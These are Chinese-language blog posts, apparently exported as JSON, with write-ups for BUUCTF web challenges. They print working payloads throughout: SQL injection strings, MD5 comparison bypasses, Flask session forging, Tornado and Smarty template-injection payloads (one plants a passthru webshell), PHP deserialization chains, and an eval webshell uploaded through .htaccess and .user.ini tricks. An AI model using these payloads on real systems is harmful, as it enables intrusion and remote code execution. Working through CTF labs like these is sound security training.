[{"categories":["CTF"],"content":"BUUCTF WEB 1 [BJDCTF2020]Easy MD5 response包中有Hint提示\nHTTP/1.1 200 OK Server: openresty Date: Wed, 31 Jan 2024 04:19:31 GMT Content-Type: text/html; charset=UTF-8 Connection: close Vary: Accept-Encoding Hint: select * from \u0026#39;admin\u0026#39; where password=md5($pass,true) X-Powered-By: PHP/7.3.13 Cache-Control: no-cache Content-Length: 3107 可以知道是利用md5($pass,true)这个函数构造出sql注入的payload进行利用，即\nselect * from \u0026#39;admin\u0026#39; where password=md5($pass,true) select * from \u0026#39;admin\u0026#39; where password=\u0026#39;or\u0026#39;1 所有需要应该字符串来构造相应的payload，如ffifdyop ，对应的MD5为0x276f722736c95d99e921722cf9ed621c，这个是16进制的，由于MySQL默认把16进制转成ASCII，所以会变成'or'6É]é!r,ùíb，满足上述开头，接着来到第二个页面\n\u0026lt;!-- $a = $GET[\u0026#39;a\u0026#39;]; $b = $_GET[\u0026#39;b\u0026#39;]; if($a != $b \u0026amp;\u0026amp; md5($a) == md5($b)){ // wow, glzjin wants a girl friend. --\u0026gt; PHP在处理哈希字符串时，它把每一个以“0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以“0E”开头的，PHP会当作科学计数法来处理，也就是0的n次方，得到的值比较的时候都相同。只有是弱比较才能用！！！\n以下值在md5加密后以0E开头：\rQNKCDZO\r240610708\rs878926199a\rs155964671a\rs214587387a\rs214587387a 下一关\n\u0026lt;?php error_reporting(0); include \u0026#34;flag.php\u0026#34;; highlight_file(__FILE__); if($_POST[\u0026#39;param1\u0026#39;]!==$_POST[\u0026#39;param2\u0026#39;]\u0026amp;\u0026amp;md5($_POST[\u0026#39;param1\u0026#39;])===md5($_POST[\u0026#39;param2\u0026#39;])) { echo $flag; } ?\u0026gt; php的md5()无法处理数组，结果返回为NULL，所以使用数组绕过就行\nparam1[]=111\u0026amp;param2[]=222 [HCTF 2018]admin 思路一：弱口令 思路二：Flask Session伪造 注册登录后，在change页面找到源码网址\nhttps://github.com/woadsl1234/hctf_flask/ 访问拿到源码，并且发现是flask网站，抓包也有flask session\nPOST /login HTTP/1.1 Host: fb32d279-c5b3-4f60-8889-ff92cf77b52d.node5.buuoj.cn:81 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------3987393260628375106622242395 Content-Length: 287 Origin: http://fb32d279-c5b3-4f60-8889-ff92cf77b52d.node5.buuoj.cn:81 Connection: close Referer: http://fb32d279-c5b3-4f60-8889-ff92cf77b52d.node5.buuoj.cn:81/login Cookie: session=.eJw9j8FqwzAQRH-l6NyD7aSXQA4BOcaGlRDIFruX4NquHdlKoS3IVsi_V7SQ0ywM-2bmzi7Xnh3u7OWdHRhxlRGfN7L9AhZTweeErPKgmwV0FyQ_rcTHTGT5JrkKaGePJk-Al_EHPIZ-ElmZCQ471HWQurIQygQKfJO8WqRRkVHuwKkEdTWBjhpGL-x5Aqv2aDsvHPh4b2TqNGasqBeHBvdU1KvUeQA7rmTUkT1eWff99XH5-ZyH23MCmIgvyKI9z8RhA557WaAnQ45cnKQh1hMWM5UIPsYadYrj8Q93de04PElD05R0-ndurYsGa9njF7f_Yjs.Zbt3cQ.lbiU5iv-IXjUVquN9B9XGZVc9x8 Upgrade-Insecure-Requests: 1 -----------------------------3987393260628375106622242395 Content-Disposition: form-data; name=\u0026#34;username\u0026#34; a -----------------------------3987393260628375106622242395 Content-Disposition: form-data; name=\u0026#34;password\u0026#34; a -----------------------------3987393260628375106622242395-- 利用脚本解码session\nhttps://github.com/noraj/flask-session-cookie-manager 上述脚本decode输出结果无法直接就行encode，所以使用以下脚本decode，结果可以直接encode\nimport sys import zlib from base64 import b64decode from flask.sessions import session_json_serializer from itsdangerous import base64_decode def decryption(payload): payload, sig = payload.rsplit(b\u0026#39;.\u0026#39;, 1) payload, timestamp = payload.rsplit(b\u0026#39;.\u0026#39;, 1) decompress = False if payload.startswith(b\u0026#39;.\u0026#39;): payload = payload[1:] decompress = True try: payload = base64_decode(payload) except Exception as e: raise Exception( \u0026#39;Could not base64 decode the payload because of an exception\u0026#39;) if decompress: try: payload = zlib.decompress(payload) except Exception as e: raise Exception( \u0026#39;Could not zlib decompress the payload before decoding the payload\u0026#39; ) return session_json_serializer.loads(payload) if __name__ == \u0026#39;__main__\u0026#39;: # print(decryption(sys.argv[1].encode())) session = b\u0026#39;.eJw9kEGLwjAQhf_KMmcPbXUvggchtVSYhEBqmFzE1dqaNi5UJW3E_77BBU8z8HjfvDdP2J-H-tbC8j486hnsLydYPuHrB5ZgmMwM6yZjTz1aSjnrEmOlR7XrUR2DYOvRsCbjWT4JJgPZzpPOE2Rl9KCncGp5Vmac4ZxUFYTaWgxlggV9C7bthZaRUc7RyYTUtkUVZ2g8t5sWrVyQPXru0Md9MrpK442RVO9I08IU1ShUHtA2o9FyBa8ZHG_DeX__7errpwLqiC-MJbvpDMMJWe5FQd5o44yLlRTGeNxSJhPOmhijSqlZvXEXd2jqD6ne7Uqz_leuBxcFOMAMHrd6eP8M0gRef9vxa1Y.Zbt_JQ.A8Wr3XzTIQKDpoUd_JP5SKVSBMY\u0026#39; print(decryption(session)) 解码得到\n{\u0026#39;_fresh\u0026#39;: True, \u0026#39;_id\u0026#39;: b\u0026#39;d46d92f7e265494f4015e173801d867a2843b90aa4022f30c7a7b6437a5392c3240f982e9d38272d4a2a144c8061a248b706c0242ee5841a9faf8de1913281ed\u0026#39;, \u0026#39;csrf_token\u0026#39;: b\u0026#39;1b70fcb1dd320108f0effff553643ccd4484a55b\u0026#39;, \u0026#39;image\u0026#39;: b\u0026#39;yUHd\u0026#39;, \u0026#39;name\u0026#39;: \u0026#39;a\u0026#39;, \u0026#39;user_id\u0026#39;: \u0026#39;10\u0026#39;} 构造admin用户session，然后encode，但encode需要密钥，在源码中找一下，找到直接构造\n思路三：Unicode欺骗 需要进行代码审计，其中有一个函数\ndef strlower(username): username = nodeprep.prepare(username) return username nodeprep.prepare()这个函数对于特殊字符会做如下处理\nᴬ -\u0026gt; A -\u0026gt; a 所以注册一个特殊符号的用户，后端会处理成admin用户，我们修改密码，然后直接登录\n[MRCTF2020]你传你🐎呢 简单的文件上传，限制了MIME类型，使用jpg，.htaccess绕过就行\n[护网杯 2018]easy_tornado Tornado render()函数 STTI，hint提示cookie_secret，从而得知必须要知道cookie_secret\nHTTP/1.1 200 OK Server: openresty Date: Fri, 02 Feb 2024 07:11:48 GMT Content-Type: text/html; charset=UTF-8 Content-Length: 46 Connection: close Etag: \u0026#34;e73bd18a2a11c4a6d40c20c19f7abc8828daed51\u0026#34; Cache-Control: no-cache /hints.txt\u0026lt;br\u0026gt;md5(cookie_secret+md5(filename)) 在各个地方尝试STTI，最后在error页面拿到cookie_secret，handler是Tornado最重要的对象，信息基本都在他身上\nGET /error?msg={{handler.application.settings}} HTTP/1.1 Host: 04183e51-6c5a-4db6-8607-f71a4ca0354a.node5.buuoj.cn:81 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 HTTP/1.1 200 OK Server: openresty Date: Fri, 02 Feb 2024 07:42:26 GMT Content-Type: text/html; charset=UTF-8 Content-Length: 225 Connection: close Etag: \u0026#34;e9d687ab39303c59dbcec9e081a1a5d2f531f21e\u0026#34; Cache-Control: no-cache \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;style\u0026gt;body{font-size: 30px;}\u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt;{\u0026amp;#39;autoreload\u0026amp;#39;: True, \u0026amp;#39;compiled_template_cache\u0026amp;#39;: False, \u0026amp;#39;cookie_secret\u0026amp;#39;: \u0026amp;#39;9a6fccf5-2228-4cae-9759-59b111eb39e7\u0026amp;#39;}\u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; [ZJCTF 2019]NiZhuanSiWei 绕过后进行反序列化\n\u0026lt;?php $text = $_GET[\u0026#34;text\u0026#34;]; $file = $_GET[\u0026#34;file\u0026#34;]; $password = $_GET[\u0026#34;password\u0026#34;]; if(isset($text)\u0026amp;\u0026amp;(file_get_contents($text,\u0026#39;r\u0026#39;)===\u0026#34;welcome to the zjctf\u0026#34;)){ echo \u0026#34;\u0026lt;br\u0026gt;\u0026lt;h1\u0026gt;\u0026#34;.file_get_contents($text,\u0026#39;r\u0026#39;).\u0026#34;\u0026lt;/h1\u0026gt;\u0026lt;/br\u0026gt;\u0026#34;; if(preg_match(\u0026#34;/flag/\u0026#34;,$file)){ echo \u0026#34;Not now!\u0026#34;; exit(); }else{ include($file); //useless.php $password = unserialize($password); echo $password; } } else{ highlight_file(__FILE__); } ?\u0026gt; 先要对第一个判断进行绕过，已知没有包含这个内容的文件，使用需要使用伪协议构造内容，可以使用\nphp://input，结合POST传参进行构造，如下 POST /?text=php://input HTTP/1.1 Host: bc9b97c7-289a-4345-8882-c772d7707103.node5.buuoj.cn:81 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Cache: no-cache Content-Length: 20 Origin: moz-extension://7e8bf9cd-f227-44fd-a6f5-66eb975a6d16 Connection: close welcome to the zjctf data://text/plain;base64,SSBsb3ZlIFBIUAo= data://text/plain,sadsadasds data://是一个流封装协议，可以不借助文件直接把内容包含在php文件中，如下 GET /?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY= HTTP/1.1 Host: bc9b97c7-289a-4345-8882-c772d7707103.node5.buuoj.cn:81 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 第二个判断是防止非预期解法，根据提示包含useless.php文件\n\u0026lt;?php class Flag{ //flag.php public $file; public function __tostring(){ if(isset($this-\u0026gt;file)){ echo file_get_contents($this-\u0026gt;file); echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; return (\u0026#34;U R SO CLOSE !///COME ON PLZ\u0026#34;); } } } ?\u0026gt; 根据提示falg在flag.php中，所以构造对于类\n\u0026lt;?php class Flag { //flag.php public $file = \u0026#34;flag.php\u0026#34;; public function __tostring() { if (isset($this-\u0026gt;file)) { echo file_get_contents($this-\u0026gt;file); echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; return (\u0026#34;U R SO CLOSE !///COME ON PLZ\u0026#34;); } } } $flag = new Flag(); echo serialize($flag); // O:4:\u0026#34;Flag\u0026#34;:1:{s:4:\u0026#34;file\u0026#34;;s:8:\u0026#34;flag.php\u0026#34;;} ?\u0026gt; [极客大挑战 2019]HardSQL 先一个个试，或者直接Fuzz跑一下，看看回显，最后发现是报错注入，不过过滤了很多关键字，也可以Fuzz一下，看看有什么没被过滤的\n过滤了空格所以payload都使用括号来代替，过滤=号使用like代替，报错注入可以使用extractvalue、updatexml这两个方法来利用，都是利用参数类型错误达到效果payload基本相似\nsql = \u0026#34;select * from user where username=\u0026#39;$username\u0026#39; and password=\u0026#39;$password\u0026#39;\u0026#34; -- updatexml-- payload = \u0026#34;1\u0026#39;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23\u0026#34; -- extractvalue -- payload = \u0026#34;1\u0026#39;or(extractvalue(0x0a,concat(0x0a,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())))))%23\u0026#34; payload = \u0026#34;1\u0026#39;or(extractvalue(0x0a,concat(0x0a,(select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(database())))))%23\u0026#34; payload = \u0026#34;1\u0026#39;or(extractvalue(0x0a,concat(0x0a,(select(group_concat(right(password,25)))from(H4rDsq1)))))%23\u0026#34; [MRCTF2020]Ez_bypass \u0026lt;!-- I put something in F12 for you --\u0026gt; \u0026lt;?php include \u0026#39;flag.php\u0026#39;; $flag=\u0026#39;MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}\u0026#39;; if(isset($_GET[\u0026#39;gg\u0026#39;])\u0026amp;\u0026amp;isset($_GET[\u0026#39;id\u0026#39;])) { $id=$_GET[\u0026#39;id\u0026#39;]; $gg=$_GET[\u0026#39;gg\u0026#39;]; if (md5($id) === md5($gg) \u0026amp;\u0026amp; $id !== $gg) { echo \u0026#39;You got the first step\u0026#39;; if(isset($_POST[\u0026#39;passwd\u0026#39;])) { $passwd=$_POST[\u0026#39;passwd\u0026#39;]; if (!is_numeric($passwd)) { if($passwd==1234567) { echo \u0026#39;Good Job!\u0026#39;; highlight_file(\u0026#39;flag.php\u0026#39;); die(\u0026#39;By Retr_0\u0026#39;); } else { echo \u0026#34;can you think twice??\u0026#34;; } } else{ echo \u0026#39;You can not get it !\u0026#39;; } } else{ die(\u0026#39;only one way to get the flag\u0026#39;); } } else { echo \u0026#34;You are not a real hacker!\u0026#34;; } } else{ die(\u0026#39;Please input first\u0026#39;); } ?\u0026gt; \u0026lt;!-- Please input first --\u0026gt; 简单的绕过，先是数组绕过，后是数字加字符串拼接绕过\n\u0026lt;!-- I put something in F12 for you --\u0026gt; \u0026lt;?php include \u0026#39;flag.php\u0026#39;; $flag=\u0026#39;MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}\u0026#39;; if(isset($_GET[\u0026#39;gg\u0026#39;])\u0026amp;\u0026amp;isset($_GET[\u0026#39;id\u0026#39;])) { $id=$_GET[\u0026#39;id\u0026#39;]; $gg=$_GET[\u0026#39;gg\u0026#39;]; if (md5($id) === md5($gg) \u0026amp;\u0026amp; $id !== $gg) { echo \u0026#39;You got the first step\u0026#39;; if(isset($_POST[\u0026#39;passwd\u0026#39;])) { $passwd=$_POST[\u0026#39;passwd\u0026#39;]; if (!is_numeric($passwd)) { if($passwd==1234567) { echo \u0026#39;Good Job!\u0026#39;; highlight_file(\u0026#39;flag.php\u0026#39;); die(\u0026#39;By Retr_0\u0026#39;); } else { echo \u0026#34;can you think twice??\u0026#34;; } } else{ echo \u0026#39;You can not get it !\u0026#39;; } } else{ die(\u0026#39;only one way to get the flag\u0026#39;); } } else { echo \u0026#34;You are not a real hacker!\u0026#34;; } } else{ die(\u0026#39;Please input first\u0026#39;); } ?\u0026gt; \u0026lt;!-- Please input first --\u0026gt; [网鼎杯 2020 青龙组]AreUSerialz 简单的POP，注意变量为protected\n\u0026lt;?php include(\u0026#34;flag.php\u0026#34;); highlight_file(__FILE__); class FileHandler { protected $op; protected $filename; protected $content; function __construct() { $op = \u0026#34;1\u0026#34;; $filename = \u0026#34;/tmp/tmpfile\u0026#34;; $content = \u0026#34;Hello World!\u0026#34;; $this-\u0026gt;process(); } public function process() { if($this-\u0026gt;op == \u0026#34;1\u0026#34;) { $this-\u0026gt;write(); } else if($this-\u0026gt;op == \u0026#34;2\u0026#34;) { $res = $this-\u0026gt;read(); $this-\u0026gt;output($res); } else { $this-\u0026gt;output(\u0026#34;Bad Hacker!\u0026#34;); } } private function write() { if(isset($this-\u0026gt;filename) \u0026amp;\u0026amp; isset($this-\u0026gt;content)) { if(strlen((string)$this-\u0026gt;content) \u0026gt; 100) { $this-\u0026gt;output(\u0026#34;Too long!\u0026#34;); die(); } $res = file_put_contents($this-\u0026gt;filename, $this-\u0026gt;content); if($res) $this-\u0026gt;output(\u0026#34;Successful!\u0026#34;); else $this-\u0026gt;output(\u0026#34;Failed!\u0026#34;); } else { $this-\u0026gt;output(\u0026#34;Failed!\u0026#34;); } } private function read() { $res = \u0026#34;\u0026#34;; if(isset($this-\u0026gt;filename)) { $res = file_get_contents($this-\u0026gt;filename); } return $res; } private function output($s) { echo \u0026#34;[Result]: \u0026lt;br\u0026gt;\u0026#34;; echo $s; } function __destruct() { if($this-\u0026gt;op === \u0026#34;2\u0026#34;) $this-\u0026gt;op = \u0026#34;1\u0026#34;; $this-\u0026gt;content = \u0026#34;\u0026#34;; $this-\u0026gt;process(); } } function is_valid($s) { for($i = 0; $i \u0026lt; strlen($s); $i++) if(!(ord($s[$i]) \u0026gt;= 32 \u0026amp;\u0026amp; ord($s[$i]) \u0026lt;= 125)) return false; return true; } if(isset($_GET{\u0026#39;str\u0026#39;})) { $str = (string)$_GET[\u0026#39;str\u0026#39;]; if(is_valid($str)) { $obj = unserialize($str); } } payload如下\nO:11:\u0026#34;FileHandler\u0026#34;:3:{s:5:\u0026#34;*op\u0026#34;;i:2;s:11:\u0026#34;*filename\u0026#34;;s:8:\u0026#34;flag.php\u0026#34;;s:10:\u0026#34;*content\u0026#34;;s:2:\u0026#34;hi\u0026#34;;} [GXYCTF2019]BabyUpload https://github.com/imaginiso/GXY_CTF/tree/master/Web/babyupload \u0026lt;?php session_start(); echo \u0026#34;\u0026lt;meta http-equiv=\\\u0026#34;Content-Type\\\u0026#34; content=\\\u0026#34;text/html; charset=utf-8\\\u0026#34; /\u0026gt; \u0026lt;title\u0026gt;Upload\u0026lt;/title\u0026gt; \u0026lt;form action=\\\u0026#34;\\\u0026#34; method=\\\u0026#34;post\\\u0026#34; enctype=\\\u0026#34;multipart/form-data\\\u0026#34;\u0026gt; 上传文件\u0026lt;input type=\\\u0026#34;file\\\u0026#34; name=\\\u0026#34;uploaded\\\u0026#34; /\u0026gt; \u0026lt;input type=\\\u0026#34;submit\\\u0026#34; name=\\\u0026#34;submit\\\u0026#34; value=\\\u0026#34;上传\\\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt;\u0026#34;; error_reporting(0); if(!isset($_SESSION[\u0026#39;user\u0026#39;])){ $_SESSION[\u0026#39;user\u0026#39;] = md5((string)time() . (string)rand(100, 1000)); } if(isset($_FILES[\u0026#39;uploaded\u0026#39;])) { $target_path = getcwd() . \u0026#34;/upload/\u0026#34; . md5($_SESSION[\u0026#39;user\u0026#39;]); $t_path = $target_path . \u0026#34;/\u0026#34; . basename($_FILES[\u0026#39;uploaded\u0026#39;][\u0026#39;name\u0026#39;]); $uploaded_name = $_FILES[\u0026#39;uploaded\u0026#39;][\u0026#39;name\u0026#39;]; $uploaded_ext = substr($uploaded_name, strrpos($uploaded_name,\u0026#39;.\u0026#39;) + 1); $uploaded_size = $_FILES[\u0026#39;uploaded\u0026#39;][\u0026#39;size\u0026#39;]; $uploaded_tmp = $_FILES[\u0026#39;uploaded\u0026#39;][\u0026#39;tmp_name\u0026#39;]; if(preg_match(\u0026#34;/ph/i\u0026#34;, strtolower($uploaded_ext))){ die(\u0026#34;后缀名不能有ph！\u0026#34;); } else{ if ((($_FILES[\u0026#34;uploaded\u0026#34;][\u0026#34;type\u0026#34;] == \u0026#34; \u0026#34;) || ($_FILES[\u0026#34;uploaded\u0026#34;][\u0026#34;type\u0026#34;] == \u0026#34;image/jpeg\u0026#34;) || ($_FILES[\u0026#34;uploaded\u0026#34;][\u0026#34;type\u0026#34;] == \u0026#34;image/pjpeg\u0026#34;)) \u0026amp;\u0026amp; ($_FILES[\u0026#34;uploaded\u0026#34;][\u0026#34;size\u0026#34;] \u0026lt; 2048)){ $content = file_get_contents($uploaded_tmp); if(preg_match(\u0026#34;/\\\u0026lt;\\?/i\u0026#34;, $content)){ die(\u0026#34;诶，别蒙我啊，这标志明显还是php啊\u0026#34;); } else{ mkdir(iconv(\u0026#34;UTF-8\u0026#34;, \u0026#34;GBK\u0026#34;, $target_path), 0777, true); move_uploaded_file($uploaded_tmp, $t_path); echo \u0026#34;{$t_path} succesfully uploaded!\u0026#34;; } } else{ die(\u0026#34;上传类型也太露骨了吧！\u0026#34;); } } } ?\u0026gt; 规定只能上传jpg，所以先上传一个.htaccess，再上传一个jpg，不过对文件过滤内容，如果包含\u0026lt;?则被过滤，所以使用以下方式来绕过\n\u0026lt;script language=\u0026#34;php\u0026#34;\u0026gt; @eval($_POST[\u0026#39;cmd\u0026#39;]); \u0026lt;/script\u0026gt; [SUCTF 2019]CheckIn \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;meta http-equiv=\u0026#34;X-UA-Compatible\u0026#34; content=\u0026#34;ie=edge\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Upload Labs\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h2\u0026gt;Upload Labs\u0026lt;/h2\u0026gt; \u0026lt;form action=\u0026#34;index.php\u0026#34; method=\u0026#34;post\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;file\u0026#34;\u0026gt;文件名：\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;fileUpload\u0026#34; id=\u0026#34;file\u0026#34;\u0026gt;\u0026lt;br\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; name=\u0026#34;upload\u0026#34; value=\u0026#34;提交\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026lt;?php // error_reporting(0); $userdir = \u0026#34;uploads/\u0026#34; . md5($_SERVER[\u0026#34;REMOTE_ADDR\u0026#34;]); if (!file_exists($userdir)) { mkdir($userdir, 0777, true); } file_put_contents($userdir . \u0026#34;/index.php\u0026#34;, \u0026#34;\u0026#34;); if (isset($_POST[\u0026#34;upload\u0026#34;])) { $tmp_name = $_FILES[\u0026#34;fileUpload\u0026#34;][\u0026#34;tmp_name\u0026#34;]; $name = $_FILES[\u0026#34;fileUpload\u0026#34;][\u0026#34;name\u0026#34;]; if (!$tmp_name) { die(\u0026#34;filesize too big!\u0026#34;); } if (!$name) { die(\u0026#34;filename cannot be empty!\u0026#34;); } $extension = substr($name, strrpos($name, \u0026#34;.\u0026#34;) + 1); if (preg_match(\u0026#34;/ph|htacess/i\u0026#34;, $extension)) { die(\u0026#34;illegal suffix!\u0026#34;); } if (mb_strpos(file_get_contents($tmp_name), \u0026#34;\u0026lt;?\u0026#34;) !== FALSE) { die(\u0026#34;\u0026amp;lt;? in contents!\u0026#34;); } $image_type = exif_imagetype($tmp_name); if (!$image_type) { die(\u0026#34;exif_imagetype:not image!\u0026#34;); } $upload_file_path = $userdir . \u0026#34;/\u0026#34; . $name; move_uploaded_file($tmp_name, $upload_file_path); echo \u0026#34;Your dir \u0026#34; . $userdir. \u0026#39; \u0026lt;br\u0026gt;\u0026#39;; echo \u0026#39;Your files : \u0026lt;br\u0026gt;\u0026#39;; var_dump(scandir($userdir)); } 过滤了php后缀和.htaccess，所以考虑php的用户配置文件.user.ini\n# auto_prepend_file string # Specifies the name of a file that is automatically parsed before the main file. The file is included as if it was called with the require function, so include_path is used. # auto_prepend_file 就相当于 require function，可以用于文件包含 auto_prepend_file=1.jpg 接着传入图片马，注意蚁剑利用路径应为.user.ini和1.jpg的共同目录\n[GXYCTF2019]BabySQli ","permalink":"//localhost:1313/posts/buuctf-web-1/","tags":["WEB"],"title":"BUUCTF WEB 1"},{"categories":["CTF"],"content":"BUUCTF WEB 2 [GYCTF2020]Blacklist sql注入，先找一下注入点\n/?inject=1\u0026#39;order+by+2--+ 有回显，然后尝试爆库，发现被过滤\nreturn preg_match(\u0026#34;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\\./i\u0026#34;,$inject); select被过滤，尝试HANDLER\nHANDLER tbl_name OPEN [ [AS] alias] HANDLER tbl_name READ index_name { = | \u0026lt;= | \u0026gt;= | \u0026lt; | \u0026gt; } (value1,value2,...) [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST } [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name READ { FIRST | NEXT } [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name CLOSE 但使用HANDLER需要已知表名，所以先尝试拿到表名，观察上面过滤语句发现没有过滤;，尝试堆叠注入\n/?inject=1\u0026#39;;show tables--+ /?inject=1\u0026#39;;show columns form table_name--+ 有回显，拿到表名，字段名，使用HANDLER查询字段\n-1\u0026#39;;HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;--+ 使用HANDLER必须要可以使用;\n[RoarCTF 2019]Easy Java Java web, WEB-INF, web.xml\n需要改成POST才能访问，先访问web.xml\nWEB-INF/web.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;web-app xmlns=\u0026#34;http://xmlns.jcp.org/xml/ns/javaee\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\u0026#34; version=\u0026#34;4.0\u0026#34;\u0026gt; \u0026lt;welcome-file-list\u0026gt; \u0026lt;welcome-file\u0026gt;Index\u0026lt;/welcome-file\u0026gt; \u0026lt;/welcome-file-list\u0026gt; \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;IndexController\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;com.wm.ctf.IndexController\u0026lt;/servlet-class\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;IndexController\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;/Index\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;LoginController\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;com.wm.ctf.LoginController\u0026lt;/servlet-class\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;LoginController\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;/Login\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;DownloadController\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;com.wm.ctf.DownloadController\u0026lt;/servlet-class\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;DownloadController\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;/Download\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;FlagController\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;com.wm.ctf.FlagController\u0026lt;/servlet-class\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;FlagController\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;/Flag\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; \u0026lt;/web-app\u0026gt; 拿到目录结构，直接访问FlagController.class\nWEB-INF/classes/com/wm/ctf/FlagController.class 拿到flag\n[网鼎杯 2018]Fakebook 显示目录扫描，扫到robots.txt，flag.php\n\u0026lt;?php class UserInfo { public $name = \u0026#34;\u0026#34;; public $age = 0; public $blog = \u0026#34;\u0026#34;; public function __construct($name, $age, $blog) { $this-\u0026gt;name = $name; $this-\u0026gt;age = (int)$age; $this-\u0026gt;blog = $blog; } function get($url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if ($httpCode == 404) { return 404; } curl_close($ch); return $output; } public function getBlogContents() { return $this-\u0026gt;get($this-\u0026gt;blog); } public function isValidBlog() { $blog = $this-\u0026gt;blog; return preg_match(\u0026#34;/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]{2,6}(\\:[0-9]+)?(\\/\\S*)?$/i\u0026#34;, $blog); } } blog不能进行ssrf利用，所以使用别的方式，观察到用户界面有序号，尝试sqli\n/view.php?no=1 order by 5 报错，可以sqli，但是union select的时候被ban了，发现是过滤了union select，这个组合，所以直接使用/**/绕过\n/view.php?no=-1+union/**/select+1,load_file(\u0026#39;/var/www/html/flag.php\u0026#39;),3,4--+ [BJDCTF2020]The mystery of ip php SSTI 模板注入\n{$smarty.version} {php}echo `id`;{/php} //deprecated in smarty v3 {Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\u0026#34;\u0026lt;?php passthru($_GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt;\u0026#34;,self::clearConfig())} {system(\u0026#39;ls\u0026#39;)} // compatible 